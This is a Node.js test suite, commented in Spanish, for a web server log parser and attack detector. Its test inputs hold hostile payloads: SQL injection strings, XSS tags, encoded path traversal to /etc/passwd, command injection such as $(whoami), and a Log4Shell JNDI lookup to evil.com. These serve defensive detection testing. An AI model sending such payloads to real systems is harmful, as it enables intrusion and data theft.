const test = require("node:test");
const assert = require("node:assert/strict");
const LP = require("../site/js/log.js");
const D = require("../site/js/detect.js");

// --------------------------------------------------- parser
test("parseLine: formato Combined de Nginx/Apache", () => {
  const line = '192.168.1.50 - admin [30/Oct/2026:14:22:01 +0000] "GET /products?id=5 HTTP/1.1" 200 1234 "http://ref.example/" "Mozilla/5.0"';
  const e = LP.parseLine(line, 1);
  assert.equal(e.parsed, true);
  assert.equal(e.ip, "192.168.1.50");
  assert.equal(e.user, "admin");
  assert.equal(e.method, "GET");
  assert.equal(e.path, "/products");
  assert.equal(e.query, "id=5");
  assert.equal(e.status, 200);
  assert.equal(e.bytes, 1234);
  assert.equal(e.userAgent, "Mozilla/5.0");
  assert.equal(e.date.toISOString(), "2026-10-30T14:22:01.000Z");
});

test("parseLine: formato Common (sin referer ni UA) y campos faltantes", () => {
  const e = LP.parseLine('10.0.0.1 - - [01/Jan/2026:00:00:00 +0000] "GET / HTTP/1.1" 200 -', 1);
  assert.equal(e.parsed, true);
  assert.equal(e.bytes, 0);
  assert.equal(e.userAgent, "");
});

test("parseLine: decodifica URL-encoding (incluido doble)", () => {
  const e = LP.parseLine('1.1.1.1 - - [01/Jan/2026:00:00:00 +0000] "GET /x?p=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 1', 1);
  assert.ok(e.url.includes("../../etc/passwd"));
  const dbl = LP.parseLine('1.1.1.1 - - [01/Jan/2026:00:00:00 +0000] "GET /x?p=%252e%252e%252f HTTP/1.1" 200 1', 1);
  assert.ok(dbl.url.includes("../"));
});

test("parseLine: marca líneas no parseables sin romper", () => {
  assert.equal(LP.parseLine("basura que no es un log", 1).parsed, false);
  assert.equal(LP.parseLine("", 1), null);
});

test("parseLog: cuenta parseadas y fallidas", () => {
  const r = LP.parseLog('1.1.1.1 - - [01/Jan/2026:00:00:00 +0000] "GET / HTTP/1.1" 200 1\nbasura\n');
  assert.equal(r.stats.parsed, 1);
  assert.equal(r.stats.failed, 1);
});

// --------------------------------------------------- detección por petición
const line = (ip, req, status = 200, ua = "Mozilla/5.0") =>
  `${ip} - - [30/Oct/2026:14:00:00 +0000] "${req}" ${status} 100 "-" "${ua}"`;
const detectReq = (req, ua) => D.detectOnEntry(LP.parseLine(line("9.9.9.9", req, 200, ua || "Mozilla/5.0"), 1)).map((h) => h.id);

test("detecta inyección SQL", () => {
  assert.ok(detectReq("GET /p?id=1' OR '1'='1 HTTP/1.1").includes("sqli"));
  assert.ok(detectReq("GET /p?id=1 UNION SELECT user,pass FROM users HTTP/1.1").includes("sqli"));
  assert.ok(detectReq("GET /p?id=1;WAITFOR DELAY '0:0:5' HTTP/1.1").includes("sqli"));
});

test("detecta XSS", () => {
  assert.ok(detectReq("GET /s?q=<script>alert(1)</script> HTTP/1.1").includes("xss"));
  assert.ok(detectReq("GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1").includes("xss"));
});

test("detecta path traversal y lo pilla aun URL-encodeado", () => {
  assert.ok(detectReq("GET /f?file=../../etc/passwd HTTP/1.1").includes("path-traversal"));
  assert.ok(detectReq("GET /f?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1").includes("path-traversal"));
});

test("detecta inyección de comandos", () => {
  assert.ok(detectReq("GET /ping?host=8.8.8.8;id HTTP/1.1").includes("cmd-injection"));
  assert.ok(detectReq("GET /x?c=$(whoami) HTTP/1.1").includes("cmd-injection"));
});

test("detecta Log4Shell en el User-Agent", () => {
  assert.ok(detectReq("GET / HTTP/1.1", "${jndi:ldap://evil.com/a}").includes("log4shell"));
});

test("detecta archivos sensibles y herramientas de escaneo", () => {
  assert.ok(detectReq("GET /.env HTTP/1.1").includes("sensitive-file"));
  assert.ok(detectReq("GET /.git/config HTTP/1.1").includes("sensitive-file"));
  assert.ok(detectReq("GET /backup.sql HTTP/1.1").includes("sensitive-file"));
  assert.ok(detectReq("GET / HTTP/1.1", "sqlmap/1.7").includes("scanner-ua"));
});

test("tráfico normal NO genera falsos positivos", () => {
  for (const req of ["GET / HTTP/1.1", "GET /products?category=shoes&page=2 HTTP/1.1",
    "POST /api/cart HTTP/1.1", "GET /blog/2026/my-article HTTP/1.1", "GET /search?q=camisa+azul HTTP/1.1",
    "GET /static/app.js HTTP/1.1", "GET /user/profile?id=42 HTTP/1.1"]) {
    assert.deepEqual(detectReq(req), [], "falso positivo en: " + req);
  }
});

// --------------------------------------------------- correlación / agregados
function build(lines) { return LP.parseLog(lines.join("\n")).entries; }

test("analyze: ordena las IPs por riesgo y resume por tipo", () => {
  const logs = [
    line("1.1.1.1", "GET /p?id=1' OR '1'='1 HTTP/1.1", 200),      // sqli critical
    line("1.1.1.1", "GET /f?file=../../etc/passwd HTTP/1.1", 200), // traversal high
    line("2.2.2.2", "GET /.env HTTP/1.1", 404),                    // sensitive medium
    line("3.3.3.3", "GET / HTTP/1.1", 200),                        // normal
  ];
  const r = D.analyze(build(logs));
  assert.equal(r.totalRequests, 4);
  assert.equal(r.totalIps, 3);
  assert.equal(r.suspiciousIps[0].ip, "1.1.1.1"); // mayor score primero
  assert.equal(r.suspiciousIps[0].worst, "critical");
  assert.equal(r.suspiciousIps.length, 2);        // 3.3.3.3 no es sospechosa
  assert.ok(r.byType.sqli === 1 && r.byType["path-traversal"] === 1);
});

test("analyze: detecta fuerza bruta por volumen de fallos", () => {
  const logs = [];
  for (let i = 0; i < 20; i++) logs.push(line("7.7.7.7", "POST /login HTTP/1.1", 401));
  const r = D.analyze(build(logs));
  const ip = r.suspiciousIps.find((x) => x.ip === "7.7.7.7");
  assert.ok(ip.detections.some((d) => d.id === "brute-force" && d.aggregate));
});

test("analyze: detecta escaneo de directorios por volumen de 404", () => {
  const logs = [];
  for (let i = 0; i < 30; i++) logs.push(line("8.8.8.8", `GET /admin${i} HTTP/1.1`, 404, "gobuster/3.6"));
  const r = D.analyze(build(logs));
  const ip = r.suspiciousIps.find((x) => x.ip === "8.8.8.8");
  assert.ok(ip.detections.some((d) => d.id === "dir-scan"));
  assert.ok(ip.detections.some((d) => d.id === "scanner-ua"));
});
